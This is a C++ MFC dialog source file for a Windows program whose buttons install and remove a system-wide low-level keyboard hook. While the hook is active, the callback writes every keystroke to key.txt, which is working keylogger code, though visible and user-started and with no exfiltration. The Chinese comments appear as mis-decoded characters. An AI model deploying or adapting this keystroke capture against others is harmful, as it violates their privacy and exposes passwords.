
// HookDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Hook.h"
#include "HookDlg.h"
#include "afxdialogex.h"

#include <iostream>  
#include <string>  
#include <fstream>

using namespace std;

//ȫ�ֱ���
HHOOK glhHook = NULL;			//��װ����깴�Ӿ�� 
BOOL g_bCapsLock = FALSE;		//��Сд������	
BOOL g_bShift = FALSE;			//shift��
ofstream SaveFile("key.txt");



#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CHookDlg �Ի���




CHookDlg::CHookDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CHookDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CHookDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_OUT, m_CEdit_Out);
}

BEGIN_MESSAGE_MAP(CHookDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_SET,   &CHookDlg::OnBnClickedButtonSet)
	ON_BN_CLICKED(IDC_BUTTON_UNSET, &CHookDlg::OnBnClickedButtonUnset)
END_MESSAGE_MAP()


// CHookDlg ��Ϣ�������

BOOL CHookDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CHookDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CHookDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CHookDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

//���̹��ӻص�����
LRESULT  CALLBACK  KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	char c[2];
	c[1] = 0;
	if ((wParam == WM_KEYDOWN) && (HC_ACTION == nCode)) 
	{	//�м�����

		KBDLLHOOKSTRUCT *  keyNum = (KBDLLHOOKSTRUCT *)lParam;

		//������ĸ��Сд
		if ((keyNum->vkCode == VK_CAPITAL) || (keyNum->vkCode == VK_LSHIFT) || (keyNum->vkCode == VK_RETURN) || (keyNum->vkCode >= 65 && keyNum->vkCode <= 90)) 
		{

			if (!GetKeyState(VK_CAPITAL)) 
			{	//�����д������δ������
				g_bCapsLock = FALSE;
			} else {
				g_bCapsLock = TRUE;
			}

			if (GetAsyncKeyState(VK_LSHIFT) & 0x8000) 
			{ //���shift������ס
				g_bShift = TRUE;
			} else {
				g_bShift = FALSE;
			}

			if (keyNum->vkCode >= 65 && keyNum->vkCode <= 90) 
			{
				BOOL flag = g_bCapsLock^g_bShift;//ͬ������
				if (flag) 
				{
					c[0] = keyNum->vkCode;
				} else {
					c[0] = keyNum->vkCode + 32;
				}
				SaveFile << (int)c[0] << " : " << c << endl;
			}
		}
		//��������С����
		else if (keyNum->vkCode == 144 || (keyNum->vkCode >= VK_NUMPAD0 && keyNum->vkCode <= VK_NUMPAD9))
		{ //144��ʾ����С��������

			if (GetKeyState(144)) {		//�������С��������������
				int mapKey = keyNum->vkCode - 48;
				SaveFile << keyNum->vkCode << " : " << char(mapKey) << endl;
			}

		} 
		else 
		{
			SaveFile << keyNum->vkCode << " : " << char(keyNum->vkCode) << endl;
		}
	}
	return CallNextHookEx(glhHook, nCode, wParam, lParam);
}

void CHookDlg::OnBnClickedButtonSet()
{
	m_CEdit_Out.SetWindowText(L"start\r\n");
	GetDlgItem(IDC_BUTTON_UNSET)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUTTON_SET)->EnableWindow(FALSE);

	string str = "start:";
	SaveFile << str << endl;

	//�������SetWindowsHookExA()��������Ϊhook��ʵ�ֲ�����DLL�У�����ֱ����KeyboardHookDlg.cpp��ʵ�֣����е�4������ʹ��GetModuleHandle(NULL)
	glhHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), NULL);
	if (glhHook == NULL) {
		AfxMessageBox(L"StartHookʧ�ܣ�");
	}
}


void CHookDlg::OnBnClickedButtonUnset()
{
	m_CEdit_Out.SetWindowText(L"end\r\n");

	GetDlgItem(IDC_BUTTON_SET)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUTTON_UNSET)->EnableWindow(FALSE);
	UnhookWindowsHookEx(glhHook);
}

